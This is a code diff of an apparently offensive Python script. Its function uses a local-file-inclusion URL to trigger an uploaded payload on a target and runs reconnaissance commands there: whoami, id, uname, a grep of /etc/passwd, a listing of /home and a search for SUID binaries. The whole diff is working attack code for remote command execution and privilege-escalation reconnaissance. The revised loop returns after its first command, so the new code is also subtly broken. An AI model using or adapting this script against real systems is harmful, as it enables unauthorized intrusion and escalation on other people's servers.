@@ -82,25 +82,29 @@ def trigger_payload_via_lfi(url, COOKIE):
     Appends the command parameter to the LFI URL to trigger our uploaded payload.
     """
     commands = [
+        "whoami",
         "id",
         "uname -a",
         "grep 'x:1000:' /etc/passwd",
         "ls -lAh /home",
         "find /usr/bin /bin -perm -4000 2>/dev/null",
     ]
-    cmd_string = ";".join(commands)
-    separator = "&" if "?" in url else "?"
-    full_url = f"{url}{separator}cmd={urllib.parse.quote(cmd_string)}"
-    try:
-        print(f"[*] Triggering payload via LFI at: {full_url}")
-        response = requests.get(full_url, cookies=COOKIE)
-        if response.status_code == 200:
-            print("[+] Command results:")
-            print(response.text)
-            return response.text
-        else:
-            print(f"[-] Execution failed (HTTP {response.status_code})")
+    
+    for command in commands:
+        encoded_cmd = urllib.parse.quote(command)
+        separator = "&" if "?" in url else "?"
+        full_url = f"{url}{separator}cmd={encoded_cmd}"
+        print(f"[*] Triggering payload via LFI at: {full_url}\n")
+
+        try:
+            response = requests.get(full_url, cookies=COOKIE)
+            if response.status_code == 200:
+                print("[+] Command results:")
+                print(response.text)
+                return response.text
+            else:
+                print(f"[-] Execution failed (HTTP {response.status_code})")
+                return ""
+        except Exception as e:
+            print(f"[-] Trigger error: {str(e)}")
             return ""
-    except Exception as e:
-        print(f"[-] Trigger error: {str(e)}")
-        return ""
